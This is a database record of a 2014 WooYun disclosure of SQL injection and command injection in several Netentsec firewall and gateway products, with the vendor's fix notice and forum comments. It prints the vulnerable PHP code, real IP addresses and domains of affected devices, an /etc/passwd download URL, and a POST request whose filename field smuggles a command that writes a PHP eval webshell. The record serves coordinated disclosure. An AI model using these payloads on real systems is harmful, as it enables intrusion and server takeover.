{"id": 2490, "wybug_id": "wooyun-2014-059383", "wybug_title": "网康多个产品通杀漏洞可getshell（网康智能流量管理系统、网康互联网控制网关、网康下一代防火墙等等）", "wybug_corp": "网康科技", "wybug_author": "Stay", "wybug_date": "2014-05-04 14:45", "wybug_open_date": "2014-08-02 14:46", "wybug_type": "设计不当", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-04：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-05：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-29：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-07-09：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-07-19：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-02：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： 五一放假无聊，把网康能找到的产品都测试了下，黑盒进去了，利用漏洞看到了代码，还好，至少其他产品的代码比那个应用防火墙好多了，不过还是存在不少问题。网康多个设备所有版本通用漏洞：网康智能流量管理系统网康科技·日志分析中心网康集中管理平台网康互联网控制网关网康下一代防火墙包括但不限于以上产品（因为部分产品未找到实例测试） 详细说明：  html/applications/user/controllers/LoginController.php\nfunction resetpassAction() {        $this->view->translate = $this->translate;        $this->view->translate_main = $this->translate_main;        Zend_Loader::loadClass('Common_Conf_Config');        $Common_Conf_Config=new Common_Conf_Config('db_conf');        $sub = $this->getRequest()->getParam('sub');        if (isset($sub)) {            $registry = Zend_Registry::getInstance();            $db_conf = $registry->get('db_conf');            $username= $this->getRequest()->getParam('username');            $useremail = $this->getRequest()->getParam('useremail');            if (!$username) {                echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR1').\"'); </script>\\n\";                echo \"<script>document.location.href='resetpass';</script>\\n\";                exit;            }            if (!$useremail) {                echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR2').\"'); </script>\\n\";                echo \"<script>document.location.href='resetpass';</script>\\n\";                exit;            }            if( !eregi(\"^[a-z0-9]+([_\\\\.-][a-z0-9]+)*\". \"@([a-z0-9]+([\\.-][a-z0-9]+))*$\",$useremail)) {                echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR3').\"');</script>\";                echo \"<script>document.location.href='resetpass';</script>\\n\";                exit;            }            if(($username<>'reset_password_default')and($useremail<>'admin@netentsec.com')) {                $sql = \"SELECT * FROM gui_users WHERE username='$username'\";                $my = $db_conf->fetchAll($sql);                if(count($my)==0) {                    echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR4').\"');</script>\";                    echo \"<script>document.location.href='resetpass';</script>\\n\";                    exit;                }                elseif (count($my)!= 0 && $my[0]['email'] != $useremail) {                    echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR5').\"');</script>\\n\";                    echo \"<script>document.location.href='resetpass';</script>\\n\";                    exit;                }                $smtp_server=$Common_Conf_Config->readConfig('smtp_server','');                if($smtp_server=='') {                    echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR6').\"');</script>\";                    echo \"<script>document.location.href='resetpass';</script>\\n\";                    exit;                }                $smtp_server_port=$Common_Conf_Config->readConfig('smtp_server_port',25);                $smtp_auth_type=$Common_Conf_Config->readConfig('smtp_auth_type','off');                $smtp_user=$Common_Conf_Config->readConfig('smtp_user','');                $smtp_user_password=$Common_Conf_Config->readConfig('smtp_user_password','');                if($smtp_auth_type=='on') {                    if($smtp_user=='') {                        echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR7').\"');</script>\";                        echo \"<script>document.location.href='resetpass';</script>\\n\";                        exit;                    }                    if($smtp_user_password=='') {                        echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_ERROR8').\"');</script>\";                        echo \"<script>document.location.href='resetpass';</script>\\n\";                        exit;                    }                    $auth=1;                }                else {                    $auth=0;                }                $smtp_mail_from=$Common_Conf_Config->readConfig('smtp_mail_from',$smtp_user);                $status=mt_rand (10000,32767);                $hash=md5($my[0]['id'].$status.$username);                if((isset($_SERVER[\"HTTPS\"]))and($_SERVER[\"HTTPS\"]=='on')) {                    $http_head=\"https\";                }else {                    $http_head='http';                }                $http_url=$http_head.\"://\".$_SERVER[\"SERVER_NAME\"].\"/user/login/resetpass1?id=\".$my[0]['id'].\"&confirm_hash=\".$hash;                $body=$this->translate_main->_('RESET_PASS_EMAIL_BODY1').\"\\r\\n\\r\\n\".$this->translate_main->_('RESET_PASS_EMAIL_BODY5').\"\\r\\n\\r\\n\".$http_url.\"\\r\\n\\r\\n\".$this->translate_main->_('RESET_PASS_EMAIL_BODY2').$username.\"\\r\\n\\r\\n\".$this->translate_main->_('RESET_PASS_EMAIL_BODY3').$_SERVER[\"REMOTE_ADDR\"].\"\\r\\n\\r\\n\".$this->translate_main->_('RESET_PASS_EMAIL_BODY4');                $from = $smtp_mail_from;                $to = $useremail;                $subject = $this->translate_main->_('RESET_PASS_EMAIL_TITLE');                putenv('subject='.$subject);                putenv('mail_to='.$to);                if($fp=@fopen(\"/var/www/html/tmp/tmpmail\",\"w\")) {                    fputs($fp,$body);                    fclose($fp);                    putenv('content=/var/www/html/tmp/tmpmail');                }                $msg=shell_exec('/var/www/html/scripts/sendmail');                @unlink(\"/var/www/html/tmp/tmpmail\");                if ($msg==0) {                    $sql=\"update gui_users set status=\".$status.\" where username='\".($username).\"'\";                    $db_conf->query($sql);                    try {                        Zend_Loader::loadClass('User_Log_Eventlog');                        $Eventlog = new User_Log_Eventlog('db_log');                        $Eventlog->LogAdd($username,'get_pass_mail','reset_pass',$_REQUEST,1);                    } catch (Exception $e) {                    }                    echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_NOTICE1').$useremail.$this->translate_main->_('RESET_PASS_NOTICE2').\"');</script>\";                    echo \"<script>document.location.href='/';</script>\\n\";                    exit();                }                else {                    echo \"<script>alert('\".$this->translate_main->_('RESET_PASS_NOTICE3').\"');</script>\";                    echo \"<script>document.location.href='resetpass';</script>\\n\";                    exit();                }            }else {                exit;            }        }        else {            $this->view->addScriptPath( BASE_PATH . '/user/views/scripts/login');            $this->render(\"resetpass\");        }    }\nusername没有过滤造成sql注入以下产品通杀，但不限于以下系统\n网康智能流量管理系统：https://117.117.107.118/user/login/resetpass网康科技·日志分析中心：http://202.192.18.125/login/resetpass网康集中管理平台https://60.30.254.218/user/login/resetpass网康互联网控制网关https://hbzjw.net.cn/user/login/resetpass网康下一代防火墙https://js-lianfa.com/user/login/resetpass\n   漏洞证明：  \n\n\n\n\n\n可注入进后台然后getshell后台任意文件下载：https://qujiangyizhong.com/system/backup/down?path=/etc/passwdgetshell：问题出在备份那里，可执行任意命令\nPOST /system/backup/backup HTTP/1.1Host: qujiangyizhong.comConnection: keep-aliveContent-Length: 24Origin: https://qujiangyizhong.comX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.116 Safari/537.36Content-Type: application/x-www-form-urlencoded; charset=UTF-8Accept: */*DNT: 1Referer: https://qujiangyizhong.com/system/backup/indexAccept-Encoding: gzip,deflate,sdchAccept-Language: zh-CN,zh;q=0.8Cookie:data:filename=backup_20140501;echo \"<?php eval(\\$_POST[cmd]);?>\" > /var/www/html/tmp/test.php;\n\n\n\n\n最新版(3.0)的:\n\n\n\n其他系统：\n\n   修复方案：     版权声明：转载请注明来源 Stay@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-05 23:31 厂商回复： 非常感谢帮助我们发现了问题。涉及到的漏洞我们已经在通过hotfix修复，在线设备默认情况下可自行完成升级，少数低版本或用户手动关闭自动更新功能的设备需进行手动升级，我们的服务部门将尽快通过多种形式通知用户。 最新状态： 2014-07-14：hotfix已经修复  ", "replys": "漏洞评价：\n评论\n     2014-05-04 14:46 |    \t\tMoc \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:12        | 屌丝何苦为难屌丝)\t\t \n  又是网康。    \n     2014-05-04 14:48 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  尼玛...    \n     2014-05-04 14:55 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1727 漏洞数:140        | 如果大海能够带走我的矮丑...)\t\t \n  尼玛，掉渣天，路人甲，z7y要给你生孩子！！！    \n     2014-05-04 14:55 |    \t\tzzR  \t\t\t( 核心白帽子 |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  网康得怎样感谢乌云才能表达出内心深深的爱呀    \n     2014-05-04 14:58 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @zzR 这种爱恨交织的情感是十分难以表达的，既纠结，又痛苦    \n     2014-05-04 14:59 |    \t\tMody \t\t\t( 普通白帽子  |\t\t\t        Rank:110 漏洞数:27        | \"><img src=x onerror=alert(1);> <img s...)\t\t \n  言简意赅：尼玛，网康被你们玩烂了。。。    \n     2014-05-04 15:01 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:915 漏洞数:79        | 度假中...)\t\t \n  @xsser @疯狗 @zzR 我猜，这才是真爱，如果恨，说明爱的深    \n     2014-05-04 15:03 |    \t\t西毒 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:33        | 心存谦卑才能不断超越自我)\t\t \n  菊花都被捅烂了    \n     2014-05-04 15:26 |    \t\t小忆 \t\t\t( 路人 |\t\t\t        Rank:24 漏洞数:5        | 跑江湖的，偶尔傻笑一下)\t\t \n  网康哭的那叫惨啊！    \n     2014-05-04 16:05 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这是涉及三个设备？凌乱了    \n     2014-05-04 16:07 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  　　＞　下一代防火墙 NGFW　　＞　上网行为管理 ICG　　＞　Web应用防火墙 WAF　　＞　智能流量管理 ITM　　＞　广域网优化网关WOG　　＞　安全代理服务器 NPS　　＞　应用安全网关 ASG网康目前的产品线清单...    \n     2014-05-04 16:11 |    \t\tStay \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:1        | Stay)\t\t \n  @疯狗 准确的说是涉及5个产品，但不限于5个，因为其他的没找到实例测试    \n     2014-05-04 16:46 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @Stay 明白了，问题果然不是单独存在的    \n     2014-05-04 17:05 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  包括但不限于    \n     2014-05-04 17:08 |    \t\tElegance \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:3        | 此人很懒，什么话都没留下！)\t\t \n  大神，网康都快被你们玩哭了    \n     2014-05-04 20:19 |    \t\t大白菜 \t\t\t( 实习白帽子  |\t\t\t        Rank:52 漏洞数:19        )\t\t \n  又打雷了！！！！    \n     2014-05-04 21:03 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  网康这么差劲？漏洞那么多？    \n     2014-05-04 21:17 |    \t\tMeirLin \t\t\t( 实习白帽子  |\t\t\t        Rank:96 漏洞数:30        | 号借人)\t\t \n  厉害，mark等公开    \n     2014-05-04 23:49 |    \t\t破锁 \t\t\t( 路人 |\t\t\t        Rank:23 漏洞数:6        )\t\t \n  网康牛b吹大了    \n     2014-05-05 10:27 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  网康最近好悲剧啊    \n     2014-05-05 10:31 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  你们这样发别人都不用干了，可以直接那啥了…………关门？    \n     2014-05-28 19:03 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @Stay  是post注入把。但是不知道为啥sqlmap说不是注入点    \n     2014-05-29 16:46 |    \t\tStay \t\t\t( 路人 |\t\t\t        Rank:30 漏洞数:1        | Stay)\t\t \n  @mango 应该是修复了吧    \n     2014-05-29 21:07 |    \t\tmango \t\t\t( 核心白帽子 |\t\t\t        Rank:1668 漏洞数:248        | 我有个2b女友！)\t\t \n  @Stay 7.2的版本好像修复了    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}